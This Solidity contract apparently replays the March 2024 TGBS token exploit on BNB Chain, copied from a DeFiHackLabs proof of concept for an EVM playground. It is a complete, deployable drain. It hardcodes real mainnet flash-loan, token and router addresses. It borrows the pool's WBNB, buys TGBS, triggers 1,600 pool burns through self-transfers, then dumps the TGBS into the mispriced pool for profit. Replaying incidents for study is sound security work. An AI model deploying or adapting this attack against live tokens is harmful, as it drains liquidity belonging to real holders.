// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-03-TGBS).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// DPP flash-loan callback `DPPFlashLoanCall` lives on the test itself, so there is
// no standalone contract to deploy). This contract is a faithful, self-contained
// copy of that inline attack (testExploit + DPPFlashLoanCall + WBNBToTGBS +
// TGBSToWBNB) so the playground can deploy it and record run(). Logic and
// constants are copied verbatim from test/TGBS_exp.sol.
//
// Root cause: TGBS's tax-on-transfer hook calls a permissionless _burnPool() on
// every plain (non-swap-pair) transfer. _burnPool() destroys 0.3% of the AMM
// pair's TGBS balance and force-syncs the pair on a per-call latch that advances
// every time it fires -- so hammering self-transfers 1,600 times in one tx fires
// 1,600 uncompensated pool burns, collapsing the TGBS side of the pool while the
// WBNB side is untouched, then the attacker dumps pre-bought TGBS into the
// mispriced pool.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface ITGBS is IERC20 {
    function _burnBlock() external view returns (uint256);
}

interface DVM {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IUniRouterV2 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external;
}

contract TGBSDrain {
    DVM private constant DPPOracle = DVM(0x05d968B7101701b6AD5a69D45323746E9a791eB5);
    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    ITGBS private constant TGBS = ITGBS(0xedecfA18CAE067b2489A2287784a543069f950F4);
    IUniRouterV2 private constant Router = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    // step 0: flash-borrow the DPPOracle's entire WBNB balance; the callback does the rest.
    function run() external {
        uint256 baseAmount = WBNB.balanceOf(address(DPPOracle));
        DPPOracle.flashLoan(baseAmount, 0, address(this), abi.encodePacked(uint32(0)));
    }

    function DPPFlashLoanCall(address, uint256 baseAmount, uint256, bytes calldata) external {
        // step 1: buy TGBS with the borrowed WBNB.
        WBNB.approve(address(Router), baseAmount);
        WBNBToTGBS(baseAmount);

        // step 2: hammer self-transfers -- each plain transfer fires _burnPool(),
        // burning 0.3% of the pair's TGBS and syncing, 1,600 times in this tx.
        uint256 i;
        while (i < 1600) {
            TGBS.transfer(address(this), 1);
            uint256 burnBlock = TGBS._burnBlock();
            // If burn block is not the current block number, a burn actually fired.
            if (burnBlock != block.number) {
                ++i;
            }
        }

        // step 3: dump the pre-bought TGBS back into the now-mispriced pool.
        TGBS.approve(address(Router), TGBS.balanceOf(address(this)));
        TGBSToWBNB(TGBS.balanceOf(address(this)));

        // step 4: repay the flash loan; whatever WBNB remains is profit.
        WBNB.transfer(address(DPPOracle), baseAmount);
    }

    function WBNBToTGBS(uint256 amountIn) private {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(TGBS);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp + 10
        );
    }

    function TGBSToWBNB(uint256 amountIn) private {
        address[] memory path = new address[](2);
        path[0] = address(TGBS);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amountIn, 0, path, address(this), block.timestamp + 10
        );
    }
}
